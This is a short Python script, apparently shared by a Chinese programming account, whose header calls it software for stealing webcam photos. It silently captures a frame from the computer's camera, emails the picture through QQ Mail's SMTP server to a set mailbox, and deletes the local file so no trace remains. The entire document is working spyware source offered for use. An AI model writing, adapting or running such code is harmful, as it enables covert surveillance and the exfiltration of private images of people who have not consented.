/**
 * @公众号：Python图书馆
 * @Date 2021/4/2 19:17
 * @Version 1.0
 * @Description 用 Python 写了一个窃取摄像头照片的软件
 */

import os                                       # 删除图片文件
import cv2                                      # 调用摄像头拍摄照片
from smtplib import SMTP_SSL                    # SSL加密的   传输协议
from email.mime.text import MIMEText            # 构建邮件文本
from email.mime.multipart import MIMEMultipart  # 构建邮件体
from email.header import Header                 # 发送内容

# 调用摄像头拍摄照片
def get_photo():
    cap = cv2.VideoCapture(0)           # 开启摄像头
    f, frame = cap.read()               # 将摄像头中的一帧图片数据保存
    cv2.imwrite('image.jpg', frame)     # 将图片保存为本地文件
    cap.release()                       # 关闭摄像头

# 把图片文件发送到我的邮箱
def send_message():
    # 选择QQ邮箱发送照片
    host_server = 'smtp.qq.com'         # QQ邮箱smtp服务器
    pwd = '****************'            # 授权码
    from_qq_mail = 'QQ@qq.com'          # 发件人
    to_qq_mail = 'QQ@qq.com'            # 收件人
    msg = MIMEMultipart()               # 创建一封带附件的邮件

    msg['Subject'] = Header('摄像头照片', 'UTF-8')    # 消息主题
    msg['From'] = from_qq_mail                       # 发件人
    msg['To'] = Header("YH", 'UTF-8')                # 收件人
    msg.attach(MIMEText("照片", 'html', 'UTF-8'))    # 添加邮件文本信息

    # 加载附件到邮箱中  SSL 方式   加密
    image = MIMEText(open('image.jpg', 'rb').read(), 'base64', 'utf-8')
    image["Content-Type"] = 'image/jpeg'   # 附件格式为图片的加密数据
    msg.attach(image)                      # 附件添加

    # 开始发送邮件
    smtp = SMTP_SSL(host_server)           # 链接服务器
    smtp .login(from_qq_mail, pwd)         # 登录邮箱
    smtp.sendmail(from_qq_mail, to_qq_mail, msg.as_string())  # 发送邮箱
    smtp.quit()     # 退出

if __name__ == '__main__':
    get_photo()                 # 开启摄像头获取照片
    send_message()              # 发送照片
    os.remove('image.jpg')      # 删除本地照片
